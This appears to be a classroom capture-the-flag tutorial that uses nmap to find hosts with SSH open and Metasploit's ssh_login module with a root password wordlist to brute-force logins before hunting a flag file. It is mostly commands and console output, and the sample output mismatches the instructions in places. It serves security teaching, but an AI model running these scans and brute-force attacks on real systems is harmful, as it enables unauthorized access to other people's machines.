# Capture The Flag With Metasploit

## The Targets

Find raspberry pi's running on the network with port 22 (SSH) open:

```bash
$ nmap -p 22 -oG - 192.168.1.0/24
```

Piping results to a file:

```bash
$ nmap -p 22 -oG - 192.168.1.0/24 | awk '/22\/open/ {print $2}' > live-hosts.txt
```

## The Brute Force Password Attack

We will use a brute force password attack against the targets we found in the previous step.

### Password List

Viewing our list of passwords that comes with metasploit:

```bash
$ head /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

root
root !root
root Cisco
root NeXT
root QNX
root admin
root attack
root ax400
root bagabu
root blablabla
```

### Starting Metasploit

Let's launch the metasploit command shell:

```bash
$ msfconsole

[-] starting the Metasploit Framework console...-
[-] ***

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v5.0.35-dev                          ]
+ -- --=[ 1903 exploits - 1072 auxiliary - 329 post       ]
+ -- --=[ 545 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 >
```

### Loading The SSH Login Attack

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > show options
```

Will output:

```bash

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
```

### Configuring The Attack
We'll load the file that we created in the previous step with our targets as our "RHOSTS" (Remote Hosts):

```bash
msf auxiliary(ssh_login) > set RHOSTS file:live_hosts.txt
rhosts => file:live_hosts.txt

msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

msf auxiliary(ssh_login) > set VERBOSE false
VERBOSE => false
```

### Running The Attack

```bash
msf auxiliary(ssh_login) > run

[*] 192.168.1.154:22 - SSH - Starting buteforce
[*] Command shell session 1 opened (?? -> ??) at 2010-09-09 17:25:18 -0600
[+] 192.168.1.154:22 - SSH - Success: 'msfadmin':'msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions -i 1
[*] Starting interaction with 1...

id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
exit
[*] Command shell session 1 closed.
msf auxiliary(ssh_login) >
```

If you're successful you will see the output above. Now grab this ip address and login with it via ssh using the password matched:

```bash
$ ssh root@<the ip address here>
```

## Find The Flag

There is a file named "cyber2019flag.txt" somewhere on the file system. Use the `find` command to locate this file on the file system and then grap the secret code inside and be the first to write it on the dry erase board up front!

Hint:

```bash
# find / -name <some filename here>
```
